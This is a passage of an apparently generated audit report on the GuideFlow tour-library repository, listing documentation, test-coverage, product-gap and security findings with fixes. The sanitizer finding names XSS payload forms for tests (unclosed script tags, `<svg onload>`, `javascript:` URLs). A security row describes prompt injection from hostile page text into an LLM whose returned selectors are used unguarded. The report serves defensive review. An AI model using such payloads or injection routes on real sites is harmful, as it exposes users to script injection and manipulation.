  <br>**Impact:** `GuideBrain` (packages/ai/src/brain.ts) has no `stopWatch` member at all — `gf.ai.stopWatch()` throws `TypeError: gf.ai.stopWatch is not a function`. Cleanup is done via the function returned by `watch()`, which the same page documents as `watch(): void` (line 61) — so a reader following this page has no working way to stop intent monitoring and leaks four document-level listeners. `compress(steps)` at line 83 is doc…
  <br>**Fix:** Delete the `stopWatch()` section; document `const stop = gf.ai.watch()` / `stop()`. Correct the signatures to `watch(): () => void` and `compress(steps: Step[], instance: GuideFlowInstance, userId?: string): Promise<Step[]>`. Replace `answer.answer`/`answer.stepId` with `answer.text`/`answer.highlights` here and at api/ai/create-ai.md:54 …
- **`i18n-guide-entirely-fictional`** — The i18n guide documents setLocale() and arbitrary translation keys; neither exists  
  [`apps/docs/guide/i18n.md:39`](../../apps/docs/guide/i18n.md#L39) · *docs* · CONFIRMED
  <br>**Impact:** `I18nRegistry` (packages/core/src/i18n/index.ts) exposes `register(locale, strings: Partial<Locale>)`, `use(locale)`, `t(key: keyof Locale, vars?)`, `activeLocale`, and `getLocale(locale?): Locale`. There is no `setLocale` — `gf.i18n.setLocale('es')` is a TypeError at runtime. Worse, `Locale` is a closed interface of exactly 8 UI strings (next, prev, close, skip, stepOf, done, openHint, closeHint), so the guide's ent…
  <br>**Fix:** Rewrite apps/docs/guide/i18n.md around the real API: `gf.i18n.register('es', { next: 'Siguiente', prev: 'Anterior', done: 'Hecho' })` then `gf.i18n.use('es')`, and state explicitly that only the 8 built-in chrome strings are translatable while step content must be localised by the caller (e.g. via an async `content` function). Update the …
- **`intent-signal-shape-fabricated`** — Intent-detection docs describe an IntentSignal shape and field the code does not produce  
  [`apps/docs/guide/ai-intent.md:47`](../../apps/docs/guide/ai-intent.md#L47) · *docs* · CONFIRMED
  <br>**Impact:** The real `IntentSignal` (packages/core/src/types/index.ts:279) is `{ type; element?: string; confidence: number; duration?: number }` — there is no `context` object, so `signal.context.page` throws `TypeError: Cannot read properties of undefined`. `validateIntentSignal` (packages/ai/src/validation.ts) never constructs a `context` field either. Separately, apps/docs/guide/ai.md:54 branches on `signal.intent === 'check…
  <br>**Fix:** Replace the fabricated interface in ai-intent.md with the actual `IntentSignal` from packages/core/src/types/index.ts:279, and fix guide/ai.md:54 to `if (signal.type === 'confused' && signal.confidence > 0.8)`.
- **`license-wrong-owner-url`** — LICENSE names a GitHub account that does not own the repository  
  [`LICENSE:3`](../../LICENSE#L3) · *docs* · CONFIRMED
  <br>**Impact:** The MIT copyright line points at `github.com/johnmugabe` while repo.config.json:5 and every package manifest declare `github.com/RealNerdZW/GuideFlow`. Meanwhile README.md:609 attributes copyright to "GuideFlow Contributors" and apps/docs/.vitepress/config.ts:310 renders "Copyright © {year} GuideFlow Contributors". Three different copyright holders across the three surfaces a downstream legal review would check, and …
  <br>**Fix:** Settle on one holder and make LICENSE, README.md:609 and the VitePress footer agree. Update LICENSE line 3 to the repo.config.json `authorUrl`, and add LICENSE to the sync-repo-meta.mjs replacement list.
- **`migration-guides-wrong-events-and-fields`** — Both migration guides map old APIs onto GuideFlow events and options that do not exist  
  [`apps/docs/guide/migrate-driver.md:19`](../../apps/docs/guide/migrate-driver.md#L19) · *docs* · PLAUSIBLE
  <br>**Impact:** `TourEvents` (packages/core/src/types/index.ts:202-216) contains no `tour:end` — the real events are `tour:complete` and `tour:abandon`. `Step` (types/index.ts:53-72) has no `allowDismiss`. migrate-driver.md:55 shows `createGuideFlow({ spotlight: { opacity: 0.75 } })` but `SpotlightOptions` (types/index.ts:121-133) declares `overlayOpacity`, not `opacity`, so it is a TS excess-property error and a silent no-op. migra…
  <br>**Fix:** Correct both mapping tables to the real event names (`tour:complete`, `tour:abandon`, `step:skip`), `stop()`, and `spotlight.overlayOpacity`; delete the `allowDismiss` row. Either implement real `data-intro`/`data-step`/`data-position` aliases in intro-compat.ts (which would make the Intro.js migration claim true) or fix README.md:546 and…
- **`no-coverage-thresholds`** — No coverage thresholds anywhere, and coverage is never collected in CI  
  [`packages/core/vitest.config.ts:6`](../../packages/core/vitest.config.ts#L6) · *test-coverage* · CONFIRMED
  <br>**Impact:** packages/core is the only package with a `coverage` block and it declares no `thresholds`/`lines`/`branches` — so even if coverage were collected, nothing fails. The ai, analytics and react vitest configs have no coverage section at all. No package's `test` script passes `--coverage`, and ci.yml never runs it (line 45 is a bare `turbo run test`). turbo.json:16 declares `"outputs": ["coverage/**"]` for the test task, …
  <br>**Fix:** Add `thresholds: { lines: 80, functions: 80, branches: 70, statements: 80 }` to packages/core/vitest.config.ts, replicate the coverage block in the ai/analytics/react configs, change each `test` script to `vitest run --coverage`, and add a coverage-upload/enforcement step to ci.yml.
- **`no-tests-for-create-guide-flow`** — packages/core/src/index.ts — the package's entire public assembly — has no test file  
  [`packages/core/src/index.ts:156`](../../packages/core/src/index.ts#L156) · *test-coverage* · CONFIRMED
  <br>**Impact:** 389 LOC with no corresponding `__tests__` entry. Untested behaviour includes the Object.assign-onto-TourEngine trick and the pre-bound method captures the comments at lines 201-211 warn are recursion hazards, the renderer action dispatch switch (178-189), the persistence resume path (243-260), `_saveProgress` (322-339), `configure()` nonce propagation, `listFlows`, the lazy `getGuideFlow()` singleton, the `guideflow`…
  <br>**Fix:** Add packages/core/src/__tests__/create-guide-flow.test.ts covering: start-by-id vs inline flow, the warn+return for an unknown flow id, next/prev/goTo/send each persisting a snapshot, renderer action dispatch for next/prev/skip/end/custom, `configure({nonce})` reaching hotspots and hints, `destroy()` releasing every subsystem, the lazy si…
- **`no-tests-svelte-cli-devtools`** — Svelte, CLI and DevTools packages have no test script and no tests at all  
  [`packages/svelte/package.json:59`](../../packages/svelte/package.json#L59) · *test-coverage* · CONFIRMED
  <br>**Impact:** packages/svelte has no `test` key, so `turbo run test` skips it entirely — its 123-LOC `createTourStore` (store creation, the five event subscriptions at index.ts:132-136, and the `destroy()` cleanup loop) is never executed by any test. Same for packages/cli (363 LOC across init/studio/export/push — including the `export` static-extraction regex and the `push` auth/error handling) and packages/devtools (~2,350 LOC in…
  <br>**Fix:** Add `"test": "vitest run"` plus a vitest.config.ts to packages/svelte and packages/cli. For svelte, test store emission on each forwarded event and that `destroy()` unsubscribes all five. For cli, unit-test `exportCommand`'s regex extraction against a real flow file and `pushCommand`'s missing-key / non-2xx paths with a stubbed `fetch`. F…
- **`sanitizer-tests-only-cover-happy-path`** — HTML sanitizer tests cover four benign payloads and none of the known regex bypasses  
  [`packages/core/src/__tests__/renderer.test.ts:58`](../../packages/core/src/__tests__/renderer.test.ts#L58) · *test-coverage* · CONFIRMED
  <br>**Impact:** `_sanitizeHTML` (packages/core/src/renderer/default-renderer.ts:243-257) is a chain of regex replacements applied to attacker-influenceable `content.html` before `el.innerHTML =` (line 93). The four tests feed it only well-formed, lowercase, single-pass payloads. Untested and unhandled classes include: unclosed tags (`<script src=x`, which the paired-tag regex never matches), nested/overlapping constructs where one r…
  <br>**Fix:** Add a table of ~20 XSS payloads (unclosed tags, mixed case, nested reconstruction, `<svg onload>`, `<math>`, unquoted and whitespace/entity-obfuscated `javascript:` URLs) asserting no dangerous node or attribute survives — parsing the sanitized output with DOMParser and walking it rather than substring-matching the string. Strongly consid…
- **`source-header-identity-mismatch`** — Six package entry points carry a different author identity than every manifest and repo.config.json  
  [`packages/core/src/index.ts:5`](../../packages/core/src/index.ts#L5) · *docs* · CONFIRMED
  <br>**Impact:** This identical header block appears at lines 5 and 7 of packages/core/src/index.ts, packages/react/src/index.ts, packages/vue/src/index.ts, packages/svelte/src/index.ts, packages/ai/src/index.ts, packages/analytics/src/index.ts and packages/cli/src/index.ts — seven files. Every one names `github.com/johnmugabe` and a `263tickets.co.zw` address, while repo.config.json:2 says `RealNerdZW` and all eight package.json man…
  <br>**Fix:** Replace `@github`/`@email` in the seven `src/index.ts` headers with the values from repo.config.json, or drop the personal fields and keep only `@license`. Then extend scripts/sync-repo-meta.mjs to cover them (see the sync-script finding).
- **`stale-version-strings`** — Two published documentation surfaces still advertise v0.1.4 while packages are at 0.1.9  
  [`apps/docs/packages/index.md:44`](../../apps/docs/packages/index.md#L44) · *docs* · CONFIRMED
  <br>**Impact:** Every package manifest says `"version": "0.1.9"`, and packages/devtools/src/panel/app.tsx:1018 renders "Extension v0.1.9". But the deployed VitePress "Version Matrix" says 0.1.4, and the legacy docs/index.html:54 shows a `v0.1.4` badge with docs/changelog.html:38 declaring "v0.1.4 — Latest, Released: April 7, 2026". Users reading the published site under-install by five patch releases and the changelog omits every ch…
  <br>**Fix:** Delete the hard-coded version from apps/docs/packages/index.md:44 (link to the npm badge instead), and either delete docs/*.html or regenerate index.html/changelog.html. Restore the Changesets workflow — `pnpm changeset` per PR — so versions and changelogs are generated rather than hand-edited.
- **`theme-tokens-fabricated`** — Every CSS custom property listed in the theme and custom-token docs has the wrong name  
  [`apps/docs/themes/custom.md:16`](../../apps/docs/themes/custom.md#L16) · *docs* · CONFIRMED
  <br>**Impact:** Of the 21 tokens documented across custom.md and the five theme pages, only `--gf-popover-bg`, `--gf-popover-border` and `--gf-overlay-color`/`--gf-overlay-opacity` are real (packages/core/src/styles/tokens.css:3-53). The rest are invented: the real names are `--gf-popover-text` (not `-color`), `--gf-border-radius` (not `--gf-popover-border-radius`), `--gf-shadow` (not `--gf-popover-shadow`), `--gf-accent-color`/`--g…
  <br>**Fix:** Generate the token tables directly from packages/core/src/styles/tokens.css so they cannot drift, and replace `.guideflow-popover` with `:root` / `.gf-popover` in all four samples. Add a docs test that asserts every `--gf-*` name mentioned in apps/docs/themes/*.md appears in tokens.css.
- **`ttl-zero-doc-inverted`** — Persistence guide says ttl:0 disables expiry; it actually expires all progress immediately  
  [`apps/docs/guide/persistence.md:99`](../../apps/docs/guide/persistence.md#L99) · *docs* · CONFIRMED
  <br>**Impact:** packages/core/src/persistence/progress-store.ts:95 is `this._ttl = config.ttl ?? DEFAULT_TTL` — nullish coalescing, so `0` is kept, not replaced. `saveSnapshot` then writes `expiresAt: Date.now() + 0` (line 104) and `loadSnapshot` evicts on `if (Date.now() > entry.expiresAt)` (line 113). With `ttl: 0` every snapshot, every dismissal, and every completion record is discarded on the very next read — the exact opposite …
  <br>**Fix:** Either implement the documented semantics (`const ttl = config.ttl === 0 ? Infinity : config.ttl ?? DEFAULT_TTL`) or correct persistence.md:99 to say `ttl: 0` expires immediately and that `Infinity` is the way to disable expiry. Add a progress-store test for `ttl: 0` and for `ttl: Infinity`.
- **`vacuous-tests`** — Multiple tests assert nothing about behaviour; two have no assertion at all  
  [`packages/core/src/__tests__/spotlight.test.ts:18`](../../packages/core/src/__tests__/spotlight.test.ts#L18) · *test-coverage* · CONFIRMED
  <br>**Impact:** The querySelector result is discarded and the assertion checks that a variable assigned two lines earlier is defined — it can never fail. All four spotlight tests are of this form, so `SpotlightOverlay` (234 LOC: cutout geometry, scroll/resize tracking, clickThrough, backdrop dismissal) has effectively zero coverage while appearing as 4 passing tests. hint.test.ts is the same at lines 18, 30 and 44, and its `emits hi…
  <br>**Fix:** Rewrite spotlight.test.ts to assert on the actual DOM: `expect(document.querySelector('[data-gf-spotlight-cutout]')).not.toBeNull()` after show(), and that it is removed after hide()/destroy(). In hint.test.ts assert on `document.querySelectorAll('.gf-hint').length` and dispatch a real click before asserting `clickedId`. Give tour-engine.…
- **`vue-passwithnotests-zero-tests`** — @guideflow/vue reports a green test run with zero test files via --passWithNoTests  
  [`packages/vue/package.json:66`](../../packages/vue/package.json#L66) · *test-coverage* · CONFIRMED
  <br>**Impact:** `packages/vue/src/` contains `index.ts`, `plugin.ts`, and `composables/use-tour.ts` (153 LOC) and there is no `__tests__` directory anywhere in the package. `turbo run test` reports the Vue adapter as passing on every CI run while executing nothing. The Vue `useTour()` composable's reactivity wiring (the ref-sync on tour events) and `GuideFlowPlugin`'s injection key contract are entirely unverified, yet CI signals su…
  <br>**Fix:** Remove `--passWithNoTests` from packages/vue, packages/ai, packages/analytics, and packages/react `test` scripts, and add `packages/vue/src/__tests__/use-tour.test.ts` using `@vue/test-utils` (already a devDependency) covering plugin install, injection-failure error, and ref updates on `tour:start` / `step:enter` / `tour:complete`.
- **`zero-tests-ai-providers`** — Three of four AI providers have zero tests; only MockProvider is ever exercised  
  [`packages/ai/src/providers/openai.ts:45`](../../packages/ai/src/providers/openai.ts#L45) · *test-coverage* · CONFIRMED
  <br>**Impact:** packages/ai/src/__tests__/ contains brain.test.ts, dom-context.test.ts and validation.test.ts. Every one of them constructs `new MockProvider(0)` or a `vi.fn()` stub. `openai.ts` (110 LOC), `anthropic.ts` (97 LOC) and `ollama.ts` (91 LOC) — the three providers users actually ship — have no test at all. That leaves untested: the lazy `await import(...).catch()` fallback that is supposed to produce a friendly "install …
  <br>**Fix:** Add packages/ai/src/__tests__/providers.test.ts. Use `vi.mock('openai')` / `vi.mock('@anthropic-ai/sdk')` to assert the request payload and the parsed-step output, assert the missing-SDK path produces the intended error message, and stub `fetch` for OllamaProvider to assert URL, method, body and malformed-response handling.
- **`zero-tests-persistence-drivers`** — LocalStorageDriver and IndexedDBDriver have zero tests despite being the default persistence path  
  [`packages/core/src/persistence/drivers.ts:260`](../../packages/core/src/persistence/drivers.ts#L260) · *test-coverage* · CONFIRMED
  <br>**Impact:** There is no `drivers.test.ts` in packages/core/src/__tests__/. progress-store.test.ts:7-25 exercises only a hand-rolled in-memory driver, so `LocalStorageDriver`'s JSON parse/serialize round-trip, its quota-exceeded `catch` (drivers.ts:227), its SSR guards, and the entire IndexedDB implementation — `openDB` upgrade handler, transaction lifecycle, `getAllKeys`, and every `catch { return null }` swallow — are executed …
  <br>**Fix:** Add packages/core/src/__tests__/drivers.test.ts. Cover LocalStorageDriver against happy-dom's localStorage (round-trip, malformed JSON returns null, quota error is caught and warns, keys() filtering). Add `fake-indexeddb` as a devDependency and cover IndexedDBDriver get/set/remove/keys plus the upgrade path, then wire ProgressStore's TTL …

#### Product gaps (12)

- **`ai-steps-to-flow-no-adapter-and-false-validation-claim`** — AI output cannot reach core without a hand-written wrapper, and the documented 'validated against the actual DOM' step does not exist  
  [`apps/docs/guide/ai-generate.md:37`](../../apps/docs/guide/ai-generate.md#L37) · *gap* · UNVERIFIED
  <br>**Impact:** GuideBrain.generate() returns `Promise<Step[]>` (packages/ai/src/brain.ts:101) while core's start() requires a FlowDefinition with `initial` + `states`. No package exports a Step[]→FlowDefinition helper, so every doc example hand-writes `states: { main: { steps, final: true } }` (ai-generate.md:28, README.md:255) — the exact `final: true` shape that core never renders. Separately, packages/ai/src/validation.ts contai…
  <br>**Fix:** Export a `stepsToFlow(steps, { id }): FlowDefinition` helper from @guideflow/core (or @guideflow/ai) that produces a renderable non-final state, and add a real DOM-verification pass in packages/ai/src/validation.ts that drops or repairs steps whose selector does not resolve to exactly one element. Correct or remove ai-generate.md:37.
- **`changeset-directory-empty-release-inert`** — .changeset/ contains only config.json — zero changesets, so the release workflow can neither version nor publish anything  
  [`.github/workflows/release.yml:41`](../../.github/workflows/release.yml#L41) · *packaging* · UNVERIFIED
  <br>**Impact:** `ls .changeset` returns config.json only, yet every package sits at 0.1.9 — versions were hand-bumped across at least four commits (d81e049, dbef294, 4d9604b) with no changeset files. changesets/action with no pending changesets opens no release PR and runs no publish, so release.yml has never actually published anything and never will until someone writes a changeset. Because the version bumps bypassed changesets, n…
  <br>**Fix:** Either commit real changesets and let `changeset version` own the version numbers, or drop changesets and adopt an explicit release script. Add a CI gate that fails a PR touching packages/*/src with no .changeset/*.md file (already noted as missing in ci-has-no-e2e-size-coverage-or-changeset-gate) so the two can never diverge again.
- **`experiment-variant-cannot-affect-any-tour`** — ExperimentEngine returns a variant that no GuideFlow API can apply — the advertised A/B testing changes nothing  
  [`packages/analytics/src/index.ts:42`](../../packages/analytics/src/index.ts#L42) · *gap* · UNVERIFIED
  <br>**Impact:** GuideFlowConfig (packages/core/src/types/index.ts:234-248) accepts only renderer, persistence, context, spotlight, nonce, injectStyles and debug — there is no `theme`, no variant hook, and no flow-selection API. The analytics package's own module docstring shows `createGuideFlow({ theme })`, which does not type-check. apps/docs/guide/ab-testing.md:29-31 is worse: it shows `const gf = createGuideFlow({ /* Apply differ…
  <br>**Fix:** Give the seam a real API: accept a `variant`/`theme` field on GuideFlowConfig that maps to a data-gf-theme attribute, and/or add `gf.startVariant(experiment, flowsByVariantId)` in @guideflow/analytics that assigns, starts the matching FlowDefinition, and emits a `guideflow.experiment.exposed` event carrying experimentId/variantId. Fix pac…
- **`four-browser-matrix-never-executes`** — Playwright declares a chromium/firefox/webkit/mobile matrix that has never run — no code in this repo has ever executed outside Chromium and happy-dom  
  [`apps/e2e/playwright.config.ts:24`](../../apps/e2e/playwright.config.ts#L24) · *test-coverage* · UNVERIFIED
  <br>**Impact:** The four-project matrix is decorative: the suite is excluded from every CI workflow, its webServer boots Storybook instead of the fixture, and its tests reference a #start-btn that Storybook never serves. Unit tests run only under happy-dom. So Safari/WebKit-specific behaviour the library depends on — box-shadow: 0 0 0 9999px spread rendering, BroadcastChannel availability, IndexedDB quirks, ResizeObserver timing, an…
  <br>**Fix:** Fix the webServer to serve apps/e2e/fixtures (a static server rooted at the repo), add the e2e job to ci.yml on at least chromium+webkit, and publish an explicit browser support matrix in apps/docs/guide/installation.md backed by a browserslist entry.
- **`no-authoring-path-for-non-engineers`** — Combined, the studio and the DevTools extension leave zero authoring path for anyone who cannot write TypeScript  
  [`apps/docs/packages/devtools.md:11`](../../apps/docs/packages/devtools.md#L11) · *gap* · UNVERIFIED
  <br>**Impact:** The README bullet 'CLI — scaffold configs, launch the visual studio, export flows' and the AI positioning both imply a visual authoring loop. In reality: `guideflow studio` is a bare Vite server injecting one boolean; the DevTools extension is private:true, unpublished, untested, has no packaged artifact, and its bridge aborts every targeted tour on any page it is installed on; and `guideflow export` cannot round-tri…
  <br>**Fix:** Choose one authoring surface and finish it. The DevTools panel's Builder tab is closest to working — fix the bridge DataCloneError, make Load/Export round-trip a real FlowDefinition, add a packaging step and CI artifact, and publish it. Then delete the `studio` command and its README/docs claims rather than shipping two half-built editors…
- **`no-backend-cms-or-self-hosting-story`** — No backend, no flow CMS, and no self-hosting story — a tour cannot be changed without a code deploy  
  [`packages/cli/src/commands/push.ts:1`](../../packages/cli/src/commands/push.ts#L1) · *gap* · UNVERIFIED
  <br>**Impact:** `guideflow push` POSTs to https://api.guideflow.dev/v1/flows, a service with no implementation anywhere in the repo, no signup path, no documented key issuance, and no OpenAPI/schema definition. There is no server package, no docker-compose, no database schema, no auth model, and no flow-fetch client — nothing in @guideflow/core can load a FlowDefinition over the network at all. So the only way to author or edit a to…
  <br>**Fix:** Either (a) remove the Cloud/push story until a backend exists, or (b) ship a minimal self-hostable flow store: a documented JSON schema, a `gf.loadFlows(url)` fetch client in core with caching and ETag support, and a reference Express/Hono server + docker-compose under a new packages/server. Whichever you choose, state it explicitly in RE…
- **`no-checklists-surveys-banners-resource-centre`** — No checklists, NPS/surveys, banners, announcements, or resource centre — the entire non-tour adoption surface is absent  
  [`packages/core/src/index.ts:69`](../../packages/core/src/index.ts#L69) · *gap* · UNVERIFIED
  <br>**Impact:** Core's export surface is exclusively tour machinery: FlowMachine, SpotlightOverlay, computePosition, TourEngine, HotspotManager, HintSystem, ProgressStore, BroadcastSync, drivers, I18nRegistry, DefaultRenderer, intro-compat, tokens, emitter, ssr, styles. A repo-wide grep for checklist, survey, nps, banner, announcement, and 'resource cent' returns zero product hits. Every named competitor ships onboarding checklists …
  <br>**Fix:** Pick one adjacent primitive and build it properly on top of the existing FSM + persistence — an onboarding checklist is the highest-leverage (it reuses ProgressStore's completed flags and the existing renderer) and would let the project claim more than 'tour library'. Ship it as @guideflow/checklist rather than bloating core.
- **`no-flow-versioning-stale-snapshot-resume`** — FlowDefinition and FlowSnapshot carry no version, so editing a flow resumes returning users into a stale state/step index  
  [`packages/core/src/types/index.ts:111`](../../packages/core/src/types/index.ts#L111) · *bug* · UNVERIFIED
  <br>**Impact:** ProgressStore keys snapshots on `${keyFn(userId)}:${flowId}:snapshot` (packages/core/src/persistence/progress-store.ts:36) with no version, hash, or step-count fingerprint. A developer who renames a state, deletes a step, or reorders steps and redeploys will have every returning user restored via machine.restore({ state, stepIndex }) into a state that may no longer exist or a stepIndex past the end of the new steps a…
  <br>**Fix:** Add `version?: string | number` to FlowDefinition and persist it (plus a derived step-count/state-name fingerprint) on FlowSnapshot. In createGuideFlow's resume path (packages/core/src/index.ts:243-256), discard the snapshot and start fresh when the stored version/fingerprint does not match the flow being started.
- **`no-frequency-capping-or-flow-orchestration`** — No scheduling, frequency capping, cooldown, or cross-flow orchestration — nothing stops several tours firing at once  
  [`packages/core/src/persistence/progress-store.ts:36`](../../packages/core/src/persistence/progress-store.ts#L36) · *gap* · UNVERIFIED
  <br>**Impact:** ProgressStore is strictly per-flow: it records a snapshot, a completed flag, and a dismissed flag for one flowId. There is no global 'last tour shown at' timestamp, no per-session counter, no cooldown, no start/end date on a flow, and no queue or priority when two flows both want to start. Calling start() twice silently abandons the running tour (per docs-tour-engine-start-throws). A product team running four onboard…
  <br>**Fix:** Add global (not per-flow) counters to ProgressStore — lastShownAt, sessionShownCount — and a `frequency` block on FlowDefinition (maxPerSession, cooldownMs, startsAt/endsAt). Have createGuideFlow's start() consult them before _engineStart, and add an orchestrator that resolves competing flows by priority.
- **`no-targeting-or-audience-rules`** — Flows have no targeting, audience, URL, or trigger model — every tour must be started by imperative application code  
  [`packages/core/src/types/index.ts:104`](../../packages/core/src/types/index.ts#L104) · *gap* · UNVERIFIED
  <br>**Impact:** There is no `audience`, `segment`, `urlPattern`, `trigger`, or `priority` field anywhere on FlowDefinition, and createGuideFlow exposes no rule evaluator — the only conditional mechanism in the whole engine is per-step `showIf`. Deciding *who* sees a tour, *where*, and *when* is therefore entirely the host application's problem, hand-written at every call site. Targeting rules are the primary product of Userpilot, Ap…
  <br>**Fix:** Add an optional `targeting` block to FlowDefinition (urlPattern, audience predicate over GuidanceContext, startTrigger: 'manual' | 'load' | 'selector' | 'event') and a `gf.evaluate()` / `gf.autoStart()` entry point that picks the highest-priority matching flow. Document it as a first-class guide page.
- **`persistence-inert-without-caller-supplied-userid`** — Every persistence feature silently no-ops unless the caller supplies context.userId, which no quick-start does  
  [`packages/core/src/index.ts:243`](../../packages/core/src/index.ts#L243) · *gap* · UNVERIFIED
  <br>**Impact:** Resume, completion gating, dismissal, and cross-tab BroadcastSync are all inside `if (userId)`, and tour:complete only persists when `_config.context?.userId` is set (index.ts:196-201). Core never generates or stores an anonymous device id, and there is no `anonymousId` option. The README quick start, apps/docs/guide/quick-start.md, and the CLI's generated guideflow.ts all call createGuideFlow() with no context, so t…
  <br>**Fix:** Generate and persist an anonymous id (crypto.randomUUID stored under gf:anon-id) when context.userId is absent, expose it as `gf.anonymousId`, and use it as the ProgressStore key fallback. At minimum, warn once in debug mode when persistence is configured but no userId is available.
- **`window-guideflow-global-never-set-by-core`** — window.__guideflow is the DevTools extension's entire integration contract and core never sets it, nor do the docs mention it  
  [`packages/devtools/src/bridge.ts:79`](../../packages/devtools/src/bridge.ts#L79) · *missing-implementation* · UNVERIFIED
  <br>**Impact:** bridge.ts:79, :128 and :196, plus content/inspector.ts:6 and :313, all key off window.__guideflow. createGuideFlow() in packages/core/src/index.ts never assigns it, and apps/docs/packages/devtools.md — the only user-facing devtools page — never mentions the global. The only two places it is set are apps/demo/src/main.tsx:100 and apps/e2e/fixtures/index.html:26, both by hand. So a user who installs the extension again…
  <br>**Fix:** Either have createGuideFlow() assign `(window as any).__guideflow = instance` behind an opt-in `exposeGlobal` config flag, or export an explicit `exposeForDevtools(instance)` helper from @guideflow/core, and document the required step prominently in apps/docs/packages/devtools.md and the extension popup's empty state.
---

## 6. P2 / P3 — notable gaps and minor issues

184 findings, grouped by area. Each row is actionable on its own; none blocks a release by itself.

#### core (15)

| id | sev | file | issue | fix |
|---|---|---|---|---|
| `docs-migrate-intro-broken-example` | P2 | `apps/docs/guide/migrate-intro.md:52` | The Intro.js migration guide's flow shape crashes and its event/method mapping does not exist | Rewrite the "After (GuideFlow — programmatic)" example with `initial`/`states`/`content`, and correct the mapping rows to `gf.stop()`, `gf.on('tour:complete')`, `gf.on… |
| `docs-tour-engine-start-throws` | P2 | `apps/docs/api/tour-engine.md:41` | Docs claim start() throws when a tour is active; it silently abandons the running tour | Either implement the documented behaviour (throw, or return early with a warning, when `_active`) or fix the doc to "Starts a tour; if one is already running it is aba… |
| `fsm-send-to-nonexistent-state` | P2 | `packages/core/src/fsm/machine.ts:79` | FlowMachine.send() transitions into a non-existent target state, leaving an active but invisible tour | Validate in `send()`: if `!(target in this._ctx.flow.states)` log/throw and return `false` without mutating state. Additionally, in `TourEngine._renderCurrentStep`, tr… |
| `hint-numbering-restarts` | P2 | `packages/core/src/engine/hint.ts:83` | Hint badge numbering restarts at 1 on every register() call, producing duplicate numbers; hint tooltips are never rendered | Number from `this._hints.size + 1` inside the loop; either implement the tooltip element (created on mount, toggled on hover/focus/click like `HotspotManager._createTo… |
| `idb-cached-rejected-open` | P2 | `packages/core/src/persistence/drivers.ts:63` | IndexedDBDriver caches a rejected open promise forever and ignores blocked/versionchange events | Clear the cache on failure (`this._dbPromise = openDB().catch(e => { this._dbPromise = null; throw e })`), add `req.onblocked` → reject with a timeout, add `db.onversi… |
| `index-composition-untested` | P2 | `packages/core/src/__tests__/spotlight.test.ts:20` | The composition root (createGuideFlow) has zero tests, and several existing tests assert nothing | Add `src/__tests__/index.test.ts` covering: instance exposes `pause`/`resume`/`isActive` (prototype reachability), `start()` with a stored snapshot renders the restore… |
| `lazy-proxy-set-trap-loses-writes` | P2 | `packages/core/src/index.ts:365` | The deprecated `guideflow` proxy silently discards property writes | Drop `receiver` from both traps: `Reflect.set(getGuideFlow(), prop, value)` and `Reflect.get(getGuideFlow(), prop)` (the latter also avoids invoking prototype getters … |
| `machine-restore-unvalidated` | P2 | `packages/core/src/fsm/machine.ts:139` | restore() accepts an out-of-range or malformed stepIndex from untrusted storage, producing a stuck invisible tour | Clamp and validate: `this._ctx.stepIndex = Math.min(Math.max(0, Math.trunc(Number(snapshot.stepIndex) || 0)), Math.max(0, steps.length - 1))`, return a boolean so call… |
| `per-step-padding-leaks` | P2 | `packages/core/src/engine/spotlight.ts:76` | Per-step spotlight `padding` permanently mutates the overlay options and leaks into all later steps | Do not mutate instance state from `show()`: keep `_defaults` immutable and compute an effective option set per call (`const opts = { ...this._defaults, ...options }`) … |
| `renderer-no-focus-trap-or-restore` | P2 | `packages/core/src/renderer/default-renderer.ts:121` | Popover steals focus with no focus trap and never restores it; aria-labelledby dangles when the step has no title | Record `document.activeElement` in `renderStep` before focusing, restore it in `hideStep()`; add a keydown trap on the popover cycling Tab/Shift+Tab within its focusab… |
| `silent-missing-target` | P2 | `packages/core/src/engine/tour.ts:283` | A step whose target selector matches nothing silently becomes a full-screen dark modal with no warning | Distinguish the cases: when `typeof step.target === 'string'` and `querySelector` returns null, `console.warn` (unconditionally, once per step) and emit a dedicated ev… |
| `styles-global-dedupe-cross-instance` | P2 | `packages/core/src/utils/styles.ts:8` | Style injection is keyed by a module-global id set, so destroying one instance strips styles from other live instances (and the popover CSS is never removed) | Reference-count injections per id (increment on inject, only remove at zero) or scope injection per instance id; give `DefaultRenderer` a `destroy()` that calls `remov… |
| `totalsteps-is-per-state-not-per-flow` | P2 | `packages/core/src/fsm/machine.ts:61` | `totalSteps` / progress counter are per-state, contradicting the documented "total steps in the active flow" | Add flow-wide accessors to FlowMachine (`totalFlowSteps`, `flowStepIndex` computed over the state order, or an explicit step-count map) and pass those to `renderStep`,… |
| `unescaped-action-and-locale-attributes` | P2 | `packages/core/src/renderer/default-renderer.ts:187` | Step action/variant and i18n strings are interpolated into HTML attributes without escaping | Run every attribute interpolation through `_esc` (or better, build the footer with `document.createElement` + `setAttribute`/`textContent` instead of an HTML string), … |
| `localstorage-remove-keys-unguarded` | P3 | `packages/core/src/persistence/drivers.ts:32` | LocalStorageDriver.remove()/keys() are unguarded — a storage SecurityError rejects start() and the tour never opens | Wrap `remove`/`keys` in try/catch like `get`/`set`, and add a one-time availability probe (`try { localStorage.setItem('__gf', '1'); localStorage.removeItem('__gf') } … |

#### security (15)

| id | sev | file | issue | fix |
|---|---|---|---|---|
| `ai-openai-sdk-browser-throw` | P2 | `packages/ai/src/providers/openai.ts:50` | OpenAI and Anthropic clients are constructed without dangerouslyAllowBrowser, so every documented browser integration throws at first call | Detect the environment and fail loudly with actionable guidance: in `client()`, throw when `isBrowser()` is true and no `baseURL` proxy is configured, with a message p… |
| `ai-prompt-injection-to-queryselector` | P2 | `packages/ai/src/validation.ts:35` | Hostile page content is serialized into the LLM prompt, and the model's returned selectors are used unguarded in document.querySelector | In `validateSteps`/`validateGuidedAnswer`, validate every selector before accepting it: reject anything not matching a conservative character class, verify it parses i… |
| `ai-serializedom-pii-to-third-party` | P2 | `packages/ai/src/dom-context.ts:154` | serializeDOM ships the full URL (query string and fragment) plus arbitrary page text to a third-party LLM with no redaction or allow/deny list | In `serializeDOM`: strip credentials from the URL before sending (`const u = new URL(location.href); u.search=''; u.hash=''`) or make URL inclusion opt-in. Skip any el… |
| `analytics-pii-no-consent-gate` | P2 | `packages/analytics/src/collector.ts:9` | Analytics collector sends full URL, referrer, and userId to third-party transports with no consent gate or redaction | Redact by default in `base()`: emit `url_path: location.pathname` instead of `location.href`, and drop `referrer` (or reduce it to its origin). Add a consent gate on `… |
